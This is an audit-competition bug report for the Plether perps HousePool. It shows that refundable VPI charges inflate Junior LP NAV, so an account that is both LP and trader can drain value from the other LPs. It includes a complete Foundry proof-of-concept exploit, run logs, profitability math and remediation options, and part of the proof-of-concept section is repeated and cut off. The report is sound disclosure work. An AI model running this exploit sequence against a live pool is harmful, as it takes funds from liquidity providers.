# \#98818 [SC-Critical] Refundable VPI charge is recognised as distributable Junior LP NAV, letting an LP-trader extract from the remaining LPs

**Submitted on Nov 10th 2026 at 11:48:34 UTC by @Valisthea for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98818
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

# Refundable VPI charge is recognised as distributable Junior LP NAV, letting an LP-trader extract from the remaining LPs

**Target:** Plether perps, commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
**Primary location:** `packages/perps/src/libraries/CloseAccountingLib.sol:104-118`
**Enabling locations:** `packages/perps/src/libraries/HousePoolAccountingLib.sol:45-54`, `packages/perps/src/CfdEngineSettlementSidecar.sol:453-465`, `packages/perps/src/HousePool.sol:624-654`
**Assets:** `plether-arbsep-house-pool`, `plether-arbsep-junior-vault`
**Impact:** Theft of unclaimed yield
**Severity:** High

An account that is simultaneously a Junior LP and a trader redeems its Junior shares against a NAV
that contains a VPI charge the pool is still obliged to refund. The refund is then paid at close out
of capital belonging to the LPs who stayed. In the proof of concept the mark is identical at every
step and realised price PnL is exactly zero, yet the attacker ends 132.292617 USDG ahead and the
victim LP ends 443.876149 USDG behind on a 1,000,000.000000 USDG deposit.

---

## 1. Summary

VPI is a skew impact charge, not a fee. The curve is symmetric, so the amount charged when a position
opens is exactly the amount credited when the same skew unwinds at the same depth:

```
cost(S, D) - cost(0, D)   charged at open
cost(0, D) - cost(S, D)   credited at close
```

These are exact negatives. The lifetime clamp at `CloseAccountingLib:115-117` does not even need to
bind for the full refund to be paid. The charge is therefore a refundable deposit held for the life
of the position.

That refundable cash is nevertheless treated as earned LP value. `ACCOUNTING_SPEC.md:1089` states the
planner "adds only collected cash to pool assets". `CfdEngineSettlementSidecar.executeOpen` routes it
through `IHousePool.recordClaimantInflow(..., Revenue, CashArrived)`, which credits
`accountedAssets`; the next reconcile moves the surplus above claimed equity into `juniorPrincipal`
through the waterfall, and `TrancheVault.totalAssets()` reads that number to price every Junior
share.

Nothing holds the refund obligation back:

- there is no aggregate VPI accrual anywhere in scope. `grep -rn 'totalVpi\|aggregateVpi\|vpiLiabilit' src/` returns nothing;
- the pool's withdrawal reserve is `maxLiability + traderClaims + supplemental`
  (`HousePoolAccountingLib.buildWithdrawalSnapshot:45-54`), where `maxLiability` is the price-PnL
  envelope only;
- `SECURITY.md` states the same rule: "carry, VPI, fees, frozen spread, and liquidation charges stay
  outside the pre-close price book".

The per-account `vpiRebateReserveBalances` in `MarginClearinghouse` backs the opposite direction, a
trader who has already received a rebate. It does not back the pool's obligation to refund a charge
it has collected and distributed.

## 2. Root cause

`CloseAccountingLib.buildCloseState` computes the close VPI with no reference to what the pool did
with the charge in the meantime:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:104-118
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The clamp is correct for the attack it names. It bounds lifetime VPI below at zero, so a trader can
never be refunded more than they paid. The gap is on the other side of the trade: between the charge
and its refund, the money is counted as Junior LP equity and is redeemable.

## 3. Impact

Any Junior LP who redeems while a position is open is paid out of a NAV containing money the pool
owes back. The LPs who remain fund the refund when the position closes. This needs no price movement
and no oracle condition.

An account that is both the LP and the trader makes the timing deterministic: it creates the charge,
redeems against the inflated NAV, then closes and is refunded in full.

## 4. Proof of concept

Two tests, identical except for one step: whether the attacker redeems its Junior shares before
closing. Both pass. The redemption uses the production path with no shortcut: cooldown, request,
epoch maturity, funded settlement through `settleLpEpoch`, then claim.

Release parameters from `DEPLOYMENT.md` are installed over the harness defaults, which matters
because `BasePerpTest` pins `vpiFactor` to zero and switches the mechanism off.

### 4.1 Result

| | attack | control | difference |
|---|---|---|---|
| attacker net | **132.292617** | -468.663782 | **600.956399** |
| victim LP net | **-443.876149** | 156.479901 | **-600.356050** |

The attacker contributed 1,200,000.000000 USDG in total. Redeeming before the close instead of
after turns a 468.663782 USDG loss into a 132.292617 USDG profit, and turns the
victim's 156.479901 USDG gain into a 443.876149 USDG loss.

### 4.2 The charge is the curve's own number

Junior NAV before the open is 2,000,999.981734 and immediately after is 2,002,519.462253, so the charge that
entered share NAV is **1,519.480519**. Pool depth at the open is 2,002,000.000000. Evaluating the
curve directly, `vpiFactor * S^2 / D / 1e18 / 2` with `S = 780,000` and that depth, gives
**1,519.480519**. The two agree to the atom: what an exiting LP is paid is exactly the VPI
charge, not an approximation of it.

Each LP's share value rises from 999,999.990876 to 1,000,759.351455 on the open. The attacker redeems
1,000,759.351455 at that price. After the close, Junior NAV is 1,000,555.670847.

### 4.3 Scaling

Writing `f` for the attacker's share of the Junior tranche and `S` for the skew it creates against
depth `D`, the capture is `f * 0.005 * S^2 / D` and the cost is two execution fees at 4 bps of `S`.
At the skew cap `S = 0.4 D` the strategy clears its own fees when `f > 0.40`. LP entry and exit are
free outside frozen markets, because `HousePool._settlementFeeBps:1151-1153` returns zero, so the
cycle repeats once per redemption epoch.

### 4.4 Run output, verbatim

```
Ran 2 tests for test/perps/accounting/close/ZzVpiNavExtraction.t.sol:ZzVpiNavExtractionTest
[PASS] test_AttackerRedeemsAgainstRefundableVpiAndRemainingLpFundsIt() (gas: 4188608)
Logs:
  1. both LPs in, no position
     pool depth            : 2002000000000
     junior NAV            : 2000999981734
     victim share value    : 999999990876
     attacker share value  : 999999999999
     attacker wallet       : 0
     attacker clearinghouse: 200000000000
  2. position open, VPI charge now inside junior NAV
     pool depth            : 2003519480519
     junior NAV            : 2002519462253
     victim share value    : 1000759351455
     attacker share value  : 1000759360585
     attacker wallet       : 0
     attacker clearinghouse: 198168519481
  >> attacker redeemed    : 1000759351455
  3. attacker fully exited the junior tranche
     pool depth            : 1002760129064
     junior NAV            : 1001760092530
     victim share value    : 1000759342326
     attacker share value  : 0
     attacker wallet       : 1000759351455
     attacker clearinghouse: 198168519481
  4. position closed at the opening mark, zero price PnL
     pool depth            : 1001555707383
     junior NAV            : 1000555670847
     victim share value    : 999556123851
     attacker share value  : 0
     attacker wallet       : 1000759351455
     attacker clearinghouse: 199372941162
  --- outcome ---
     attacker contributed  : 1200000000000
     attacker holds        : 1200132292617
     attacker net          : 132292617
     victim deposited      : 1000000000000
     victim share value    : 999556123851
     victim net            : -443876149
     victim vs start       : -443867025

[PASS] test_ControlAttackerHoldsJuniorSharesThroughTheClose() (gas: 3985283)
Logs:
  1. both LPs in, no position
     pool depth            : 2002000000000
     junior NAV            : 2000999981734
     victim share value    : 999999990876
     attacker share value  : 999999999999
     attacker wallet       : 0
     attacker clearinghouse: 200000000000
  2. position open, VPI charge now inside junior NAV
     pool depth            : 2003519480519
     junior NAV            : 2002519462253
     victim share value    : 1000759351455
     attacker share value  : 1000759360585
     attacker wallet       : 0
     attacker clearinghouse: 198168519481
  3. position closed, attacker still an LP
     pool depth            : 2002313152807
     junior NAV            : 2001313134538
     victim share value    : 1000156489029
     attacker share value  : 1000156498153
     attacker wallet       : 0
     attacker clearinghouse: 199374847193
  >> attacker redeemed    : 1000156489025
  --- outcome ---
     attacker contributed  : 1200000000000
     attacker holds        : 1199531336218
     attacker net          : -468663782
     victim deposited      : 1000000000000
     victim share value    : 1000156479901
     victim net            : 156479901
     victim vs start       : 156489025

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 18.69ms (15.48ms CPU time)

Ran 1 test suite in 27.21ms (18.69ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

### 4.5 Test source, complete

`packages/perps/test/perps/accounting/close/ZzVpiNavExtraction.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Proof of concept. An actor who is simultaneously a Junior LP and a trader extracts value from the
// remaining Junior LPs, at an unchanged mark and with exactly zero realised price PnL.
//
// Mechanism. The VPI curve is symmetric in skew, so `cost(S,D) - cost(0,D)` charged when a position opens
// and `cost(0,D) - cost(S,D)` credited when the same skew unwinds are exact negatives. The charge is
// therefore a refundable deposit for the life of the position; the lifetime clamp in
// CloseAccountingLib:115-117 never has to bind for the refund to be paid in full.
//
// That refundable cash is nevertheless recognised as distributable LP value. ACCOUNTING_SPEC.md:1089
// states the planner "adds only collected cash to pool assets"; the charge then flows into
// `juniorPrincipal` at the next reconcile and prices every Junior share. Nothing reserves it:
//   - `grep -rn 'totalVpi\|aggregateVpi\|vpiLiabilit' src/` returns nothing, so no aggregate VPI
//     obligation exists anywhere in scope;
//   - the pool's withdrawal reserve is `maxLiability + traderClaims + supplemental`
//     (HousePoolAccountingLib:45-54), where `maxLiability` is the price-PnL envelope only;
//   - SECURITY.md agrees: "carry, VPI, fees, frozen spread, and liquidation charges stay outside the
//     pre-close price book".
//
// So an LP who redeems while a position is open is paid out of a NAV that includes money the pool still
// owes back to that position, and the LPs who stay fund the difference.
//
// Both tests run at the release parameters in DEPLOYMENT.md. The attack and the control differ in exactly
// one step: whether the attacker redeems their Junior shares before closing.
//
// Run: forge test --root packages/perps --match-path 'test/perps/accounting/close/ZzVpiNavExtraction.t.sol' -vv

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract ZzVpiNavExtractionTest is BasePerpTest {

    address private constant VICTIM = address(0xBEEF);
    address private constant ATTACKER = address(0xA11CE);

    uint256 private constant MARK = 1e8;
    uint256 private constant LP_EACH = 1_000_000e6;
    uint256 private constant TRADER_FUNDING = 200_000e6;

    // 39% of the 2,000,000 depth, just inside the 40% skew cap.
    uint256 private constant SIZE = 780_000e18;
    uint256 private constant MARGIN = 50_000e6;

    uint256 private attackerMinted;

    /// @dev Release parameters, not the harness defaults. `vpiFactor` is the field that matters: BasePerpTest
    ///      pins it to 0, which switches the entire mechanism under test off.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    /// @dev No harness-seeded Junior capital, so the pool is exactly the victim plus the attacker and the
    ///      attacker's ownership fraction is a stated 50% rather than an artefact of the fixture.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _refreshMark() private {
        vm.warp(block.timestamp + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, SafeCast.toUint64(block.timestamp));
    }

    function _shareValue(
        address holder
    ) private view returns (uint256) {
        uint256 shares = juniorVault.balanceOf(holder);
        return shares == 0 ? 0 : juniorVault.convertToAssets(shares);
    }

    /// @dev Full exit through the production redemption queue: cooldown, request, epoch maturity, funded
    ///      settlement, claim. No shortcut.
    function _exitJuniorFully(
        address lp
    ) private returns (uint256 assetsOut) {
        uint256 shares = juniorVault.balanceOf(lp);
        assertGt(shares, 0, "exit requires shares");

        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark();

        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);

        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp <= maturity) {
            vm.warp(maturity + 1);
        }
        _refreshMark();
        _settleLpEpochForTest();

        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        assertGt(claimable, 0, "the redemption must be funded");
        vm.prank(lp);
        assetsOut = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function _attackerHeldValue() private view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER) + _shareValue(ATTACKER);
    }

    function _setUpBothLegs() private {
        _refreshMark();
        _fundJunior(VICTIM, LP_EACH);
        _fundJunior(ATTACKER, LP_EACH);
        attackerMinted += LP_EACH;
        _fundTrader(ATTACKER, TRADER_FUNDING);
        attackerMinted += TRADER_FUNDING;
        _refreshMark();
    }

    function _openAtMark() private {
        _open(ATTACKER, CfdTypes.Side.LONG, SIZE, MARGIN, MARK, pool.totalAssets());
    }

    function _closeAtMark() private {
        _refreshMark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(ATTACKER);
        if (size != 0) {
            _close(ATTACKER, side, size, MARK, pool.totalAssets());
        }
    }

    function _report(
        string memory label
    ) private {
        emit log_string(label);
        emit log_named_uint("   pool depth            ", pool.totalAssets());
        emit log_named_uint("   junior NAV            ", juniorVault.totalAssets());
        emit log_named_uint("   victim share value    ", _shareValue(VICTIM));
        emit log_named_uint("   attacker share value  ", _shareValue(ATTACKER));
        emit log_named_uint("   attacker wallet       ", settlementToken.balanceOf(ATTACKER));
        emit log_named_uint("   attacker clearinghouse", clearinghouse.balanceAssets(ATTACKER));
    }

    /// @dev The attack. The attacker redeems their Junior shares while their own position is still open,
    ///      so the redemption is priced against a NAV that contains the refundable VPI charge.
    function test_AttackerRedeemsAgainstRefundableVpiAndRemainingLpFundsIt() public {
        _setUpBothLegs();

        uint256 victimStart = _shareValue(VICTIM);
        _report("1. both LPs in, no position");

        _openAtMark();
        _report("2. position open, VPI charge now inside junior NAV");

        uint256 redeemed = _exitJuniorFully(ATTACKER);
        emit log_named_uint(">> attacker redeemed    ", redeemed);
        _report("3. attacker fully exited the junior tranche");

        _closeAtMark();
        _report("4. position closed at the opening mark, zero price PnL");

        uint256 victimEnd = _shareValue(VICTIM);
        uint256 attackerEnd = _attackerHeldValue();

        emit log_string("--- outcome ---");
        emit log_named_uint("   attacker contributed  ", attackerMinted);
        emit log_named_uint("   attacker holds        ", attackerEnd);
        emit log_named_int("   attacker net          ", int256(attackerEnd) - int256(attackerMinted));
        emit log_named_uint("   victim deposited      ", LP_EACH);
        emit log_named_uint("   victim share value    ", victimEnd);
        emit log_named_int("   victim net            ", int256(victimEnd) - int256(LP_EACH));
        emit log_named_int("   victim vs start       ", int256(victimEnd) - int256(victimStart));

        assertEq(engine.lastMarkPrice(), MARK, "the mark must be unchanged end to end");
        (uint256 remaining,,,,,,) = engine.positions(ATTACKER);
        assertEq(remaining, 0, "the position must be fully closed");
    }

    /// @dev The control. Identical except that the attacker keeps their Junior shares through the close, so
    ///      they are still an LP when the pool refunds the VPI charge.
    function test_ControlAttackerHoldsJuniorSharesThroughTheClose() public {
        _setUpBothLegs();

        uint256 victimStart = _shareValue(VICTIM);
        _report("1. both LPs in, no position");

        _openAtMark();
        _report("2. position open, VPI charge now inside junior NAV");

        _closeAtMark();
        _report("3. position closed, attacker still an LP");

        uint256 redeemed = _exitJuniorFully(ATTACKER);
        emit log_named_uint(">> attacker redeemed    ", redeemed);

        uint256 victimEnd = _shareValue(VICTIM);
        uint256 attackerEnd = _attackerHeldValue();

        emit log_string("--- outcome ---");
        emit log_named_uint("   attacker contributed  ", attackerMinted);
        emit log_named_uint("   attacker holds        ", attackerEnd);
        emit log_named_int("   attacker net          ", int256(attackerEnd) - int256(attackerMinted));
        emit log_named_uint("   victim deposited      ", LP_EACH);
        emit log_named_uint("   victim share value    ", victimEnd);
        emit log_named_int("   victim net            ", int256(victimEnd) - int256(LP_EACH));
        emit log_named_int("   victim vs start       ", int256(victimEnd) - int256(victimStart));
    }

}

```

### 4.6 Supporting measurement

A second test isolates the mechanism with a single account and no LP exit, showing the charge enter
share NAV on the open and leave it on the close.

`packages/perps/test/perps/accounting/close/ZzVpiRevenueRecognition.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// MEASUREMENT, not an assertion of a bug. Reports the junior share NAV across one VPI round trip.
//
// The question. A VPI charge paid at open is, by the curve's own symmetry, refunded in full when the position
// unwinds the same skew at the same depth: cost(S,D) - cost(0,D) at open and cost(0,D) - cost(S,D) at close are
// exact negatives, so the lifetime clamp in CloseAccountingLib:115-117 does not even need to bind. The charge is
// therefore a refundable deposit for the life of the position.
//
// What this measures is whether that refundable amount is nevertheless counted into junior share NAV while the
// position is open. `TrancheVault.totalAssets()` reads `HousePool.getPendingTrancheState()`, which is the same
// number that prices every deposit and redemption, so a transient bump there is a transient mispricing of shares.
//
// Why no aggregate reserve could absorb it: `grep -rn 'totalVpi\|aggregateVpi\|vpiLiabilit' src/` returns nothing,
// and the pool's withdrawal reserve is `maxLiability + traderClaims + supplemental` (HousePoolAccountingLib:45-54),
// where maxLiability is the price-PnL envelope only. SECURITY.md states the same: "carry, VPI, fees, frozen spread,
// and liquidation charges stay outside the pre-close price book".
//
// Prediction at the deployed vpiFactor of 0.01e18, with depth D and skew S:
//   VPI charge X = 0.005 * S^2 / D. For S = 300,000 and D = 1,000,000 that is 450 USDG.
//   Execution fee = 4 bps of notional = 120 USDG per leg.
// So the open should raise junior NAV by about 570, and the close should take the 450 back and leave the fees.
//
// Run: forge test --root packages/perps --match-path 'test/perps/accounting/close/ZzVpiRevenueRecognition.t.sol' -vv

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract ZzVpiRevenueRecognitionTest is BasePerpTest {

    address private constant VICTIM_LP = address(0xBEEF);
    address private constant TRADER = address(0xA11CE);

    uint256 private constant MARK = 1e8;
    uint256 private constant NOTIONAL = 300_000e6;
    uint256 private constant SIZE = 300_000e18;

    /// @dev Release parameters from DEPLOYMENT.md, not the harness defaults. vpiFactor is the field that matters
    ///      here: BasePerpTest pins it to 0, which switches the entire mechanism under test off.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    function _refreshMark() private {
        vm.warp(block.timestamp + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, SafeCast.toUint64(block.timestamp));
    }

    function _report(
        string memory label
    ) private returns (uint256 juniorNav) {
        juniorNav = juniorVault.totalAssets();
        emit log_string(label);
        emit log_named_uint("   junior share NAV      ", juniorNav);
        emit log_named_uint("   junior supply         ", juniorVault.totalSupply());
        emit log_named_uint("   pool totalAssets       ", pool.totalAssets());
        emit log_named_uint("   trader clearinghouse   ", clearinghouse.balanceAssets(TRADER));
    }

    function test_VpiChargeEntersJuniorNavWhileRefundable() public {
        _refreshMark();
        _fundJunior(VICTIM_LP, 1_000_000e6);
        _fundTrader(TRADER, 200_000e6);
        _refreshMark();

        uint256 navBefore = _report("1. before the open");
        uint256 traderBefore = clearinghouse.balanceAssets(TRADER);

        uint256 depth = pool.totalAssets();
        emit log_named_uint(">> depth used for VPI    ", depth);
        _open(TRADER, CfdTypes.Side.LONG, SIZE, 50_000e6, MARK, depth);

        uint256 navAfterOpen = _report("2. after the open, position still live");

        // Close at the same mark and the same depth, so realised price PnL is exactly zero and the only
        // economics are the VPI round trip plus the two execution fees.
        _refreshMark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(TRADER);
        _close(TRADER, side, size, MARK, pool.totalAssets());

        uint256 navAfterClose = _report("3. after the close");
        uint256 traderAfter = clearinghouse.balanceAssets(TRADER);

        emit log_string("--- deltas ---");
        emit log_named_int("   NAV open minus before  ", int256(navAfterOpen) - int256(navBefore));
        emit log_named_int("   NAV close minus open   ", int256(navAfterClose) - int256(navAfterOpen));
        emit log_named_int("   NAV net over round trip", int256(navAfterClose) - int256(navBefore));
        emit log_named_int("   trader net             ", int256(traderAfter) - int256(traderBefore));

        // The transient component is what an exiting LP would capture and a remaining LP would fund.
        if (navAfterOpen > navBefore && navAfterClose < navAfterOpen) {
            emit log_named_uint(">>> TRANSIENT NAV BUMP   ", navAfterOpen - navAfterClose);
        }
    }

}

```

## 5. Not covered by the published limitations

The VPI limitations in `SECURITY.md` cover the lifetime clamp zeroing "otherwise extractable
rebate-only round trips", the bounded linear approximation of partial-close VPI release, and the
dependence of VPI on live canonical assets. None states that a collected charge is distributable
while it remains refundable.

The closest LP limitation is "a positive marked receivable is not cash, so share NAV can exceed
immediately redeemable liquidity". That concerns marked receivables, which are value the pool has not
collected. This report concerns the opposite: cash the pool has collected and must give back.

Two vendor tests exercise VPI round trips and neither covers this sequence.
`VpiRoundTripAccounting.t.sol::test_DepthManipulationShouldNotBeProfitable` moves depth upward with
`settlementToken.mint(address(pool), 9_000_000e6)` followed by `pool.accountExcess()`, which shrinks
the refund. `MarketMakerVpiRoundTripTest::test_VpiClampPreventsNetRebateExtraction` runs a
rebate-first round trip at constant depth. In both, no LP enters or leaves between the open and the
close.

## 6. Suggested remediation

Hold the refundable part of collected VPI out of distributable LP value until the position that owes
it is closed. Two shapes fit the existing accounting:

1. track an aggregate positive-VPI accrual across open positions and add it to the reserved side of
   `HousePoolAccountingLib.buildWithdrawalSnapshot`, so it is excluded from redeemable NAV in the
   same way trader claims already are;
2. or route the open-time VPI charge through the pending claimant bucket machinery rather than
   straight to revenue, and release it to the waterfall only when the position settles.

The first keeps the cash where it is and changes only what counts as redeemable. The second changes
when the revenue is recognised. Either removes the window without touching the clamp, which is
correct as written.

## Proof of Concept

## 4. Proof of concept

Two tests, identical except for one step: whether the attacker redeems its Junior shares before
closing. Both pass. The redemption uses the production path with no shortcut: cooldown, request,
epoch maturity, funded settlement through `settleLpEpoch`, then claim.

Release parameters from `DEPLOYMENT.md` are installed over the harness defaults, which matters
because `BasePerpTest` pins `vpiFactor` to zero and switches the mechanism off.

### 4.1 Result

| | attack | control | difference |
|---|---|---|---|
| attacker net | **132.292617** | -468.663782 | **600.956399** |
| victim LP net | **-443.876149** | 156.479901 | **-600.356050** |

The attacker contributed 1,200,000.000000 USDG in total. Redeeming before the close instead of
after turns a 468.663782 USDG loss into a 132.292617 USDG profit, and turns the
victim's 156.479901 USDG gain into a 443.876149 USDG loss.

### 4.2 The charge is the curve's own number

Junior NAV before the open is 2,000,999.981734 and immediately after is 2,002,519.462253, so the charge that
entered share NAV is **1,519.480519**. Pool depth at the open is 2,002,000.000000. Evaluating the
curve directly, `vpiFactor * S^2 / D / 1e18 / 2` with `S = 780,000` and that depth, gives
**1,519.480519**. The two agree to the atom: what an exiting LP is paid is exactly the VPI
charge, not an approximation of it.

Each LP's share value rises from 999,999.990876 to 1,000,759.351455 on the open. The attacker redeems
1,000,759.351455 at that price. After the close, Junior NAV is 1,000,555.670847.

### 4.3 Scaling

Writing `f` for the attacker's share of the Junior tranche and `S` for the skew it creates against
depth `D`, the capture is `f * 0.005 * S^2 / D` and the cost is two execution fees at 4 bps of `S`.
At the skew cap `S = 0.4 D` the strategy clears its own fees when `f > 0.40`. LP entry and exit are
free outside frozen markets, because `HousePool._settlementFeeBps:1151-1153` returns zero, so the
cycle repeats once per redemption epoch.

### 4.4 Run output, verbatim

```
Ran 2 tests for test/perps/accounting/close/ZzVpiNavExtraction.t.sol:ZzVpiNavExtractionTest
[PASS] test_AttackerRedeemsAgainstRefundableVpiAndRemainingLpFundsIt() (gas: 4188608)
Logs:
  1. both LPs in, no position
     pool depth            : 2002000000000
     junior NAV            : 2000999981734
     victim share value    : 999999990876
     attacker share value  : 999999999999
     attacker wallet       : 0
     attacker clearinghouse: 200000000000
  2. position open, VPI charge now inside junior NAV
     pool depth            : 2003519480519
     junior NAV            : 2002519462253
     victim share value    : 1000759351455
     attacker share value  : 1000759360585
     attacker wallet       : 0
     attacker clearinghouse: 198168519481
  >> attacker redeemed    : 1000759351455
  3. attacker fully exited the junior tranche
     pool depth            : 1002760129064
     junior NAV            : 1001760092530
     victim share value    : 1000759342326
     attacker share value  : 0
     attacker wallet       : 1000759351455
     attacker clearinghouse: 198168519481
  4. position closed at the opening mark, zero price PnL
     pool depth            : 1001555707383
     junior NAV            : 1000555670847
     victim share value    : 999556123851
     attacker share value  : 0
     attacker wallet       : 1000759351455
     attacker clearinghouse: 199372941162
  --- outcome ---
     attacker contributed  : 1200000000000
     attacker holds        : 1200132292617
     attacker net          : 132292617
     victim deposited      : 1000000000000
     victim share value    : 999556123851
     victim net            : -443876149
     victim vs start       : -443867025

[PASS] test_ControlAttackerHoldsJuniorSharesThroughTheClose() (gas: 3985283)
Logs:
  1. both LPs in, no position
     pool depth            : 2002000000000
     junior NAV            : 2000999981734
     victim share value    : 999999990876
     attacker share value  : 999999999999
     attacker wallet       : 0
     attacker clearinghouse: 200000000000
  2. position open, VPI charge now inside junior NAV
     pool depth            : 2003519480519
     junior NAV            : 2002519462253
     victim share value    : 1000759351455
     attacker share value  : 1000759360585
     attacker wallet       : 0
     attacker clearinghouse: 198168519481
  3. position closed, attacker still an LP
     pool depth            : 2002313152807
     junior NAV            : 2001313134538
     victim share value    : 1000156489029
     attacker share value  : 1000156498153
     attacker wallet       : 0
     attacker clearinghouse: 199374847193
  >> attacker redeemed    : 1000156489025
  --- outcome ---
     attacker contributed  : 1200000000000
     attacker holds        : 1199531336218
     attacker net          : -468663782
     victim deposited      : 1000000000000
     victim share value    : 1000156479901
     victim net            : 156479901
     victim vs start       : 156489025

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 18.69ms (15.48ms CPU time)

Ran 1 test suite in 27.21ms (18.69ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

### 4.5 Test source, complete

`packages/perps/test/perps/accounting/close/ZzVpiNavExtraction.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Proof of concept. An actor who is simultaneously a Junior LP and a trader extracts value from the
// remaining Junior LPs, at an unchanged mark and with exactly zero realised price PnL.
//
// Mechanism. The VPI curve is symmetric in skew, so `cost(S,D) - cost(0,D)` charged when a position opens
// and `cost(0,D) - cost(S,D)` credited when the same skew unwinds are exact negatives. The charge is
// therefore a refundable deposit for the life of the position; the lifetime clamp in
// CloseAccountingLib:115-117 never has to bind for the refund to be paid in full.
//
// That refundable cash is nevertheless recognised as distributable LP value. ACCOUNTING_SPEC.md:1089
// states the planner "adds only collected cash to pool assets"; the charge then flows into
// `juniorPrincipal` at the next reconcile and prices every Junior share. Nothing reserves it:
//   - `grep -rn 'totalVpi\|aggregateVpi\|vpiLiabilit' src/` returns nothing, so no aggregate VPI
//     obligation exists anywhere in scope;
//   - the pool's withdrawal reserve is `maxLiability + traderClaims + supplemental`
//     (HousePoolAccountingLib:45-54), where `maxLiability` is the price-PnL envelope only;
//   - SECURITY.md agrees: "carry, VPI, fees, frozen spread, and liquidation charges stay outside the
//     pre-close price book".
//
// So an LP who redeems while a position is open is paid out of a NAV that includes money the pool still
// owes back to that position, and the LPs who stay fund the difference.
//
// Both tests run at the release parameters in DEPLOYMENT.md. The attack and the control differ in exactly
// one step: whether the attacker redeems their Junior shares before closing.
//
// Run: forge test --root packages/perps --match-path 'test/perps/accounting/close/ZzVpiNavExtraction.t.sol' -vv

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract ZzVpiNavExtractionTest is BasePerpTest {

    address private constant VICTIM = address(0xBEEF);
    address private constant ATTACKER = address(0xA11CE);

    uint256 private constant MARK = 1e8;
    uint256 private constant LP_EACH = 1_000_000e6;
    uint256 private constant TRADER_FUNDING = 200_000e6;

    // 39% of the 2,000,000 depth, just inside the 40% skew cap.
    uint256 private constant SIZE = 780_000e18;
    uint256 private constant MARGIN = 50_000e6;

    uint256 private attackerMinted;

    /// @dev Release parameters, not the harness defaults. `vpiFactor` is the field that matters: BasePerpTest
    ///      pins it to 0, which switches the entire mechanism under test off.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    /// @dev No harness-seeded Junior capital, so the pool is exactly the victim plus the attacker and the
    ///      attacker's ownership fraction is a stated 50% rather than an artefact of the fixture.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _refreshMark() private {
        vm.warp(block.timestamp + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, SafeCast.toUint64(block.timestamp));
    }

    function _shareValue(
        address holder
    ) private view returns (uint256) {
        uint256 shares = juniorVault.balanceOf(holder);
        return shares == 0 ? 0 : juniorVault.convertToAssets(shares);
    }

    /// @dev Full exit through the production redemption queue: cooldown, request, epoch maturity, funded
    ///      settlement, claim. No shortcut.
    function _exitJuniorFully(
        address lp
    ) private returns (uint256 assetsOut) {
        uint256 shares = juniorVault.balanceOf(lp);
        assertGt(shares, 0, "exit requires shares");

        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark();

        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);

        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp <= maturity) {
            vm.warp(maturity + 1);
        }
        _refreshMark();
        _settleLpEpochForTest();

        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
